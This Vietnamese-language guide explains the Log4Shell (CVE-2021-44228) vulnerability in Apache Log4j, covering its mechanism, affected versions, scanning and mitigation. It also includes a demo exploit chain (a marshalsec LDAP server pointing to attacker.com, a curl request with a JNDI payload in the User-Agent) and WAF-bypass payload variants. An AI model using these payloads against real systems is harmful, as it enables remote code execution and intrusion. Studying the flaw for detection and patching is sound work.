1. CVE-2021-44228 là gì?

    CVE-2021-44228, còn gọi là Log4Shell, là một trong những lỗ hổng nghiêm trọng nhất từng ghi nhận trên Internet.

    Ảnh hưởng: Apache Log4j 2.x (một thư viện logging cực phổ biến dùng cho Java).

    Cho phép Remote Code Execution (RCE) qua tính năng log message bằng JNDI.

    Mức độ nguy hiểm: CVSS 10.0/10 (tối đa).

    Ảnh hưởng diện rộng: Các ứng dụng Java, cloud, game server (Minecraft, v.v.), hệ thống enterprise...

2. Cơ chế lỗ hổng

    Log4j cho phép nhúng nội dung động vào log message qua các chuỗi như ${}.

    Nếu attacker chèn log có pattern ${jndi:ldap://attacker.com/a}, Log4j sẽ tự động tải Java class từ attacker qua JNDI (LDAP, RMI, ...).

    Nếu thành công, attacker thực thi được code từ xa (Remote Code Execution).

Ví dụ payload:

${jndi:ldap://attacker.com/exploit}

    Chỉ cần gửi payload này qua bất kỳ đầu vào nào được ghi log (User-Agent, URL, form, API, ...), là có thể bị khai thác.

3. Điều kiện và phạm vi ảnh hưởng

    Ảnh hưởng: Log4j 2.x từ 2.0 đến 2.14.1 (fix ở bản >=2.15.0).

    Java app dùng Log4j để log bất kỳ thông tin gì mà attacker kiểm soát được (User-Agent, request, field form, v.v.).

    Tồn tại ở hầu hết ứng dụng lớn nhỏ, kể cả các sản phẩm đóng gói, cloud, IoT...

4. Nhận diện hệ thống bị ảnh hưởng

    Kiểm tra version Log4j:

        Tìm các file .jar trong hệ thống:

        find / -name "*log4j*.jar"

        Xem version trong tên file hoặc đọc file META-INF/MANIFEST.MF.

    Kiểm tra dependency của Java app:

        Xem file pom.xml, build.gradle, v.v.

5. Cách khai thác (demo exploit)

    Chú ý: Chỉ thử trên hệ thống test hoặc được phép kiểm thử!

A. Mô hình khai thác cơ bản

    Attacker gửi payload log

        Gửi ${jndi:ldap://attacker.com/a} vào bất kỳ field nào app sẽ log.

    Log4j resolve chuỗi JNDI

        Log4j truy cập attacker.com qua LDAP/RMI, tải Java class độc hại.

    Attacker kiểm soát server

B. Dụng cụ khai thác phổ biến

    JNDI Exploit Kit:

        https://github.com/feihong-cs/JNDIExploit

        https://github.com/mbechler/marshalsec

    Burp Suite, curl, nuclei, Metasploit, ...

C. Demo khai thác đơn giản

    Tạo server LDAP/RMI giả (dùng marshalsec hoặc JNDIExploit):

java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8080/#Exploit"

Host mã độc tại attacker.com:8080 (HTTP server đơn giản)

python3 -m http.server 8080

Gửi payload đến app bị log4j (dùng curl):

    curl -H 'User-Agent: ${jndi:ldap://attacker.com:1389/a}' http://victim.com/

    Nếu app vulnerable, server sẽ callback về attacker.com

6. Nhận diện lỗ hổng (các công cụ scan)
A. Tự kiểm tra nhanh

    Gửi payload (có thể encode, hoặc biến thể bypass WAF):

        ${jndi:ldap://<your-server>/test}

        ${${::-j}${::-n}${::-d}${::-i}:ldap://<your-server>/test}

    Check log ở phía bạn có callback không (netcat, tcpdump, Burp Collaborator, Interactsh, Canarytokens).

B. Công cụ tự động

    Nuclei template:

        https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2021/CVE-2021-44228.yaml

        Quét hàng loạt site:

        nuclei -u http://target.com -t cves/2021/CVE-2021-44228.yaml

    log4j-scan:

        https://github.com/fullhunt/log4j-scan

        Dùng để kiểm tra mass hoặc test nội bộ.

    Burp Suite Extension:

        Log4Shell scanner, Collaborator Client.

7. Bypass WAF/IDS/IPS

    Payload biến thể:

    ${jndi:ldap://attacker.com/a}
    ${${::-j}ndi:ldap://attacker.com/a}
    ${${env:ENV_NAME:-j}ndi:ldap://attacker.com/a}
    ${jndi:${lower:l}${lower:d}ap://attacker.com/a}

    Encode, obfuscate, mix case, bypass keyword filter.

8. Phòng chống và khắc phục
A. Cập nhật Log4j

    Nâng cấp lên >= 2.17.0 (khuyến nghị nhất) hoặc tối thiểu >= 2.16.0.

    # Kiểm tra lại mọi dependency, package, jar phụ thuộc

B. Nếu chưa update được, tạm thời:

    Đặt biến môi trường:

LOG4J_FORMAT_MSG_NO_LOOKUPS=true

Remove class JndiLookup khỏi log4j-core:

    zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

    Firewall chặn outbound từ server đến Internet (đặc biệt là LDAP, RMI, DNS).

    Chặn input nguy hiểm, validate input.

C. Dò tìm nội bộ

    Sử dụng các tool scan đã đề cập ở trên để rà soát toàn hệ thống.

    Kiểm tra hệ thống SIEM, log, alert với các pattern log4j để phát hiện truy cập bất thường.

9. Tấn công nâng cao & Detection nâng cao

    DNS Exfiltration: Payload gọi về DNS riêng (${jndi:dns://yourdomain/test}) để detect có callback dù không RCE.

    Blind Injection Detection: Dùng các payload callback đến domain/endpoint bạn kiểm soát để xác định lỗ hổng dù không thấy response.

10. Tài liệu, công cụ, tham khảo

    https://www.lunasec.io/docs/blog/log4j-zero-day/

    https://logging.apache.org/log4j/2.x/security.html

    Nuclei Template CVE-2021-44228

    log4j-scan

    Burp Extension

    YARA Rule

Tóm tắt nhanh

    CVE-2021-44228 (Log4Shell) là RCE cực nguy hiểm trên Java Log4j 2.x.

    Có thể khai thác qua bất kỳ đầu vào nào được log.

    Dễ scan, dễ khai thác, rất khó detect nếu không có giải pháp chuyên nghiệp.

    Cần cập nhật Log4j ngay lập tức, kiểm tra toàn hệ thống, chặn traffic không cần thiết, rà soát log và monitor callback lạ.